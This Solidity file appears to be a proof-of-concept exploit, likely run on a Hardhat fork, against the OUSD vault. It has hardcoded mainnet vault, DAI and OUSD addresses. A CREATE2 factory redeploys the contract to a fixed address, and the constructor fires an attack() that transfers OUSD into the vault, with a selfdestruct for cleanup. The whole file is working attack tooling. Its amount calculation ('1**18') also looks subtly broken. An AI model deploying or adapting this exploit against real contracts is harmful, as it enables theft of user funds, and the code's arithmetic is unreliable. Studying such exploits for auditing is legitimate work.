pragma solidity ^0.5.11;

import "hardhat/console.sol";

interface ExploitFactoryLike {
    function shouldAttack() external returns (bool);
}

interface VaultLike {
    function capitalPaused() external returns (bool);
    function rebasePaused() external returns (bool);
    function mint(address _asset, uint256 _amount, uint256 _minimum) external;
    function redeem(uint256 _amount, uint256 _minimumAmount) external;
}

interface ERC20Like {
    function totalSupply() external returns (uint256);
    function approve(address _spender, uint256 _amount) external;
    function balanceOf(address _account) external returns (uint256);
    function transfer(address _to, uint256 _amount) external;
}

interface OUSDLike {
    function balanceOf(address _account) external returns (uint256);
    function nonRebasingSupply() external returns (uint256);
    function totalSupply() external returns (uint256);
    function rebasingCreditsPerToken() external returns (uint256);
    function creditBalanceOf(address _account) external returns (uint256, uint256);
    function transfer(address _to, uint256 _amount) external;
}

contract ExploitFactory {
    bool public shouldAttack = false;

    function deploy(uint256 salt, bytes memory bytecode)
        public
        returns (address addr)
    {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        require(addr != address(0), "Create2: Failed on deploy");
    }

    function computeAddress(uint256 salt, bytes memory bytecode)
        public
        view
        returns (address)
    {
        bytes32 bytecodeHashHash = keccak256(bytecode);
        bytes32 _data = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), salt, bytecodeHashHash)
        );
        return address(bytes20(_data << 96));
    }

    function setShouldAttack(bool _shouldAttack) public {
        shouldAttack = _shouldAttack;
    }
}

contract Exploit {
    address vault = 0xE75D77B1865Ae93c7eaa3040B038D7aA7BC02F70;
    address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address ousd = 0x2A8e1E676Ec238d8A992307B495b45B3fEAa5e86;
    address attacker = 0x0000000000000000000000000000000000000001;
    address factory;

    constructor(address _factory) public {
        console.log("Exploit address", address(this));
        factory = _factory;
        if (ExploitFactoryLike(_factory).shouldAttack()) {
            attack();
        } else {
        }
    }

    function mint() public {
        uint256 daiBalance = ERC20Like(dai).balanceOf(address(this));
        ERC20Like(dai).approve(vault, daiBalance);
        VaultLike(vault).mint(dai, daiBalance, 0);
    }

    function attack() internal {
        OUSDLike(ousd).transfer(vault, uint256(22_000_000) * 1**18);
    }

    function bye() public {
        selfdestruct(msg.sender);
    }
}
